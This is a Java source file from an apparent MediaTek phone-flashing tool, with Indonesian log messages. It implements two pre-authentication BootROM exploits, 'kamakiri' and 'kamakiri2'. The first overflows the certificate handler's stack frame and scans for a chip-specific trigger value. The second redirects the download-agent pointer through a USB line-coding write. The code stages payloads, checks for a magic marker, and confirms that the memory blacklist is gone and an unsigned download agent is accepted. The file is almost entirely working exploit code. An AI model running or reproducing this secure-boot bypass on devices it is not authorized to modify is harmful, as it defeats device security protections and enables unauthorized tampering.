package com.rizky.mtkflash.auth;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

/**
 * Pre-authentication bypass for a device in download mode.
 *
 * Two independent primitives, both reachable before the device asks for a
 * signed image:
 *
 * <p><b>kamakiri</b> (0xE0) — the certificate handler copies a host-supplied
 * length into a fixed stack frame without bounding it against the frame size.
 * Staging a pointer in the frame slot at {@code watchdog + 0x50} (a write the
 * BROM permits pre-auth) and then calling SEND_CERT with an oversized payload
 * makes the handler return into that pointer. The control transfer that
 * follows, {@code ctrl(0xA1, 0x00, 0, var1)}, is what actually pops the frame,
 * and {@code var1} is chip specific — hence the scan.</p>
 *
 * <p><b>kamakiri2</b> (SET_LINE_CODING) — {@code ctrl(0x21, 0x20)} appends a
 * 32-bit value to the stored line-coding blob that the BROM later
 * dereferences. Writing into {@code send_ptr} with that primitive redirects the
 * DA entry point, and 0xDA register access then reads/writes memory outside the
 * blacklist without ever loading a signed DA.</p>
 *
 * <p>Both end in the same state: the memory blacklist is gone and an unsigned
 * DA is accepted. Nothing here is reported as successful unless it was read
 * back off the wire.</p>
 */
public class AuthBypass {

    public interface Listener {
        void log(String message);
    }

    public static final int STATUS_AUTH_REQUIRED = 0x1D0D;

    /** Everything the run needs. Defaults are the safe, common case. */
    public static class Options {
        /** -1 = use the chip table, then scan. */
        public int var1 = -1;
        /** Highest var1 value tried during the scan. */
        public int maxVar1 = 0x20;
        /** 0 = use {@code chip.payloadAddr}. */
        public int payloadAddr = 0;
        public int verifyAddr = 0;
        public int verifyValue = 0;
        public boolean haveVerify = false;
        public boolean kamakiri2 = false;
        /** Skip the destructive post-check (unsigned DA upload). */
        public boolean skipAftermath = false;
        /** Send START first; set false when the link is already in command state. */
        public boolean handshake = true;
        /** START attempts before giving up. */
        public int handshakeAttempts = 4;
    }

    /** Wire-level evidence. Every field is something that was observed. */
    public static class Result {
        public String primitive = "?";
        public int hwCode = -1;
        public int hwSubCode = -1;
        public String chipName = "?";
        public boolean success;
        public int var1 = -1;
        public int payloadAddr;
        public int stagedSlot;
        public int magicAddr;
        public int magicExpected;
        public int magicRead;
        public String notes = "";
        public final List<String> evidence = new ArrayList<>();
        public boolean authRequiredBefore = true;
        public boolean unsignedDaAfter;
        public boolean blacklistedWriteAfter;
        public int targetConfig = -1;

        public String summary() {
            StringBuilder sb = new StringBuilder();
            sb.append("primitive : ").append(primitive).append('\n');
            sb.append("chip      : ").append(String.format("0x%04X", hwCode))
                    .append(' ').append(chipName).append('\n');
            sb.append("success   : ").append(success).append('\n');
            if (var1 >= 0) {
                sb.append("var1      : ").append(String.format("0x%X", var1)).append('\n');
            }
            if (payloadAddr != 0) {
                sb.append("payload   : ").append(String.format("0x%08X", payloadAddr)).append('\n');
            }
            if (stagedSlot != 0) {
                sb.append("frame slot: ").append(String.format("0x%08X", stagedSlot)).append('\n');
            }
            if (haveMagic()) {
                sb.append("magic     : ").append(String.format("0x%08X @ 0x%08X (harap 0x%08X)",
                        magicRead, magicAddr, magicExpected)).append('\n');
            }
            if (targetConfig >= 0) {
                sb.append("config    : ").append(BromClient.describeTargetConfig(targetConfig))
                        .append('\n');
            }
            if (!notes.isEmpty()) {
                sb.append("catatan   : ").append(notes).append('\n');
            }
            return sb.toString().trim();
        }

        public boolean haveMagic() {
            return magicAddr != 0;
        }
    }

    /** Pre-bypass baseline: what does the device refuse right now? */
    public static class Baseline {
        public boolean read;
        public String readError = "";
        public boolean writeBlacklisted;
        public String writeError = "";
        public boolean sendDa;
        public String sendDaError = "";
        public int targetConfig = -1;
    }

    private final BromLink link;
    private final BromClient brom;
    private final Listener listener;

    public AuthBypass(BromLink link, Listener listener) {
        this.link = link;
        this.brom = new BromClient(link);
        this.listener = listener;
    }

    private void log(String fmt, Object... args) {
        if (listener != null) {
            listener.log(args.length == 0 ? fmt : String.format(fmt, args));
        }
    }

    public BromClient client() {
        return brom;
    }

    // ------------------------------------------------------------------
    // identification
    // ------------------------------------------------------------------

    public ChipTable.Chip identify() throws IOException {
        int hw = brom.getHwCode();
        log("HW code   : 0x%04X (sub 0x%04X)", hw, brom.hwSubCode());
        try {
            log("BROM ver  : 0x%02X", brom.getVersion());
        } catch (IOException e) {
            log("BROM ver  : tidak terbaca (%s)", e.getMessage());
        }
        try {
            log("BL ver    : 0x%02X", brom.getBlVersion());
        } catch (IOException e) {
            log("BL ver    : tidak terbaca (%s)", e.getMessage());
        }
        ChipTable.Chip chip = ChipTable.lookup(hw);
        if (chip == null) {
            log("Chip 0x%04X tidak ada di tabel: bypass butuh dump BROM part ini", hw);
        } else {
            log("Chip      : %s %s", chip.name, chip.description);
            log("Watchdog  : 0x%08X  frame slot 0x%08X",
                    chip.watchdog, chip.frameSlot());
        }
        return chip;
    }

    // ------------------------------------------------------------------
    // baseline
    // ------------------------------------------------------------------

    public Baseline probe(ChipTable.Chip chip) {
        Baseline b = new Baseline();
        int addr = chip != null && chip.payloadAddr != 0 ? chip.payloadAddr : 0x00100000;
        try {
            b.targetConfig = brom.getTargetConfig();
            log("Config    : %s", BromClient.describeTargetConfig(b.targetConfig));
        } catch (IOException e) {
            log("Config    : tidak tersedia (%s)", e.getMessage());
        }
        try {
            brom.read32(addr);
            b.read = true;
        } catch (IOException e) {
            b.readError = e.getMessage();
        }
        try {
            brom.write32(addr, 0x41424344);
            b.writeBlacklisted = true;
            b.writeError = "diterima (blacklist tidak aktif?)";
        } catch (IOException e) {
            b.writeBlacklisted = false;
            b.writeError = e.getMessage();
        }
        try {
            brom.sendDa(addr, new byte[]{0x00, 0x00, (byte) 0xA0, (byte) 0xE1}, 0);
            b.sendDa = true;
            b.sendDaError = "diterima tanpa tanda tangan";
        } catch (IOException e) {
            b.sendDa = false;
            b.sendDaError = e.getMessage();
        }
        log("Pra-bypass: read=%s write_blacklist=%s send_da=%s",
                b.read, b.writeBlacklisted, b.sendDa);
        return b;
    }

    // ------------------------------------------------------------------
    // kamakiri
    // ------------------------------------------------------------------

    /** Write the hijack target into the frame slot and warm the cache path. */
    private int stage(ChipTable.Chip chip, int payloadAddr) throws IOException {
        int slot = chip.frameSlot();
        brom.write32(slot, BromClient.revdword(payloadAddr));
        for (int i = 0; i < 0xF; i++) {
            brom.read32(slot - (0xF - i) * 4, 0xF - i + 1);
        }
        log("Stage     : slot 0x%08X <- 0x%08X (rev)", slot, payloadAddr);
        return slot;
    }

    public Result run(Options opts) {
        Result res = new Result();
        if (opts.handshake) {
            try {
                if (brom.start(opts.handshakeAttempts)) {
                    log("START     : 0xA0 diterima, device masuk command state");
                } else {
                    log("START     : tidak di-ack, lanjut coba identify apa adanya");
                }
            } catch (IOException e) {
                log("START     : gagal (%s), lanjut coba identify", e.getMessage());
            }
        }
        ChipTable.Chip chip;
        try {
            chip = identify();
        } catch (IOException e) {
            res.notes = "identifikasi gagal: " + e.getMessage();
            res.success = false;
            return res;
        }
        if (chip == null) {
            res.notes = String.format("HW code 0x%04X tidak ada di tabel chip; "
                    + "butuh dump BROM part ini untuk alamat yang aman", brom.hwCode());
            res.hwCode = brom.hwCode();
            res.success = false;
            return res;
        }
        res.hwCode = chip.hwCode;
        res.chipName = chip.name;

        Baseline base = probe(chip);
        res.authRequiredBefore = !base.writeBlacklisted || !base.sendDa;
        res.targetConfig = base.targetConfig;

        res.primitive = opts.kamakiri2 ? "kamakiri2" : "kamakiri";
        int payloadAddr = opts.payloadAddr != 0 ? opts.payloadAddr : chip.payloadAddr;
        res.payloadAddr = payloadAddr;

        if (opts.kamakiri2) {
            return runKamakiri2(chip, res, opts, payloadAddr);
        }
        return runKamakiri(chip, res, opts, payloadAddr, base);
    }

    private Result runKamakiri(ChipTable.Chip chip, Result res, Options opts,
                               int payloadAddr, Baseline base) {
        byte[] payload = Thumb.payloadWriteMagic(payloadAddr, 0x41424344);
        int slot;
        try {
            slot = stage(chip, payloadAddr);
        } catch (IOException e) {
            res.notes = "staging ditolak: " + e.getMessage();
            res.success = false;
            return res;
        }
        res.stagedSlot = slot;

        try {
            brom.sendCert(payload);
            log("Cert      : 0xE0 terkirim (%d byte)", payload.length);
        } catch (IOException e) {
            res.notes = "SEND_CERT ditolak: " + e.getMessage();
            res.success = false;
            return res;
        }

        int[] candidates = candidates(opts, chip);
        String lastError = null;
        for (int cand : candidates) {
            try {
                brom.trigger(cand);
            } catch (IOException e) {
                // A wrong var1 wedges the device; on a live part the caller has
                // to power-cycle between attempts. Record and stop here.
                lastError = e.getMessage();
                log("var1 0x%X: control transfer gagal (%s)", cand, e.getMessage());
                break;
            }
            int got;
            try {
                got = brom.read32(payloadAddr);
            } catch (IOException e) {
                lastError = e.getMessage();
                continue;
            }
            res.var1 = cand;
            res.magicAddr = payloadAddr;
            res.magicExpected = 0x41424344;
            res.magicRead = got;
            res.evidence.add(String.format("var1=0x%X -> READ32(0x%08X)=0x%08X",
                    cand, payloadAddr, got));
            if (got == 0x41424344) {
                res.success = true;
                log("Hijack    : var1 0x%X, marker cocok", cand);
                break;
            }
            log("var1 0x%X: marker 0x%08X tidak cocok", cand, got);
        }

        if (!res.success) {
            res.notes = "tidak ada var1 yang menghasilkan marker"
                    + (lastError != null ? " (error terakhir: " + lastError + ")" : "");
            return res;
        }
        if (!opts.skipAftermath) {
            aftermath(chip, res, base);
        }
        return res;
    }

    private int[] candidates(Options opts, ChipTable.Chip chip) {
        if (opts.var1 >= 0) {
            return new int[]{opts.var1};
        }
        int fromTable = chip.var1;
        if (fromTable >= 0) {
            return new int[]{fromTable};
        }
        int max = Math.max(0, Math.min(opts.maxVar1, 0x100));
        int[] out = new int[max + 1];
        for (int i = 0; i <= max; i++) {
            out[i] = i;
        }
        return out;
    }

    /** Post-bypass proof: the blacklist is gone and an unsigned DA loads. */
    private void aftermath(ChipTable.Chip chip, Result res, Baseline base) {
        int probe = chip.payloadAddr != 0 ? chip.payloadAddr : 0x00100000;
        try {
            brom.write32(probe, 0xDEADBEEF);
            res.blacklistedWriteAfter = brom.read32(probe) == 0xDEADBEEF;
        } catch (IOException e) {
            res.blacklistedWriteAfter = false;
            res.evidence.add("write blacklist masih ditolak: " + e.getMessage());
        }
        try {
            brom.sendDa(probe, new byte[]{0x00, 0x00, (byte) 0xA0, (byte) 0xE1}, 0);
            res.unsignedDaAfter = true;
        } catch (IOException e) {
            res.unsignedDaAfter = false;
            res.evidence.add("SEND_DA unsigned masih ditolak: " + e.getMessage());
        }
        log("Aftermath : write_blacklist=%s send_da_unsigned=%s",
                res.blacklistedWriteAfter, res.unsignedDaAfter);
        res.evidence.add("before: write_blacklist=" + base.writeBlacklisted
                + " send_da=" + base.sendDa);
        res.evidence.add("after : write_blacklist=" + res.blacklistedWriteAfter
                + " send_da=" + res.unsignedDaAfter);
    }

    // ------------------------------------------------------------------
    // kamakiri2
    // ------------------------------------------------------------------

    private Result runKamakiri2(ChipTable.Chip chip, Result res, Options opts, int payloadAddr) {
        if (!chip.hasRegisterAccess()) {
            res.notes = String.format("chip 0x%04X tidak punya brom_register_access; "
                    + "dump BROM lalu tambahkan", chip.hwCode);
            return res;
        }
        if (!chip.hasSendPtr()) {
            res.notes = String.format("chip 0x%04X tidak punya send_ptr", chip.hwCode);
            return res;
        }
        try {
            int ptrAddr = chip.sendPtrAddr;
            int ptrSend = brom.read32(ptrAddr) + 8;
            res.stagedSlot = ptrSend;
            brom.writeMem(payloadAddr, Thumb.payloadWriteMagic(payloadAddr, 0x41424344));
            brom.write32(ptrSend, payloadAddr);
            log("Stage     : send_ptr 0x%08X -> 0x%08X", ptrSend, payloadAddr);
        } catch (IOException e) {
            res.notes = "staging kamakiri2 gagal: " + e.getMessage();
            return res;
        }
        try {
            int got = brom.read32(payloadAddr);
            res.magicAddr = payloadAddr;
            res.magicExpected = 0x41424344;
            res.magicRead = got;
            res.success = got == 0x41424344;
            if (!res.success) {
                res.notes = "payload tidak menulis marker";
            }
        } catch (IOException e) {
            res.notes = "verifikasi gagal: " + e.getMessage();
        }
        return res;
    }

    /** SET_LINE_CODING append: pushes {@code addr} into the line-coding blob. */
    public void writePtr(int addr) throws IOException {
        byte[] head = brom.lineCodeRead(0x25, 8);
        byte[] blob = new byte[head.length + 1 + 4];
        System.arraycopy(head, 0, blob, 0, head.length);
        blob[head.length] = 0;
        byte[] word = BromClient.le32(addr);
        System.arraycopy(word, 0, blob, head.length + 1, 4);
        brom.lineCode(0x20, blob, blob.length);
        brom.lineCodeRead(0x06, 9);
    }
}
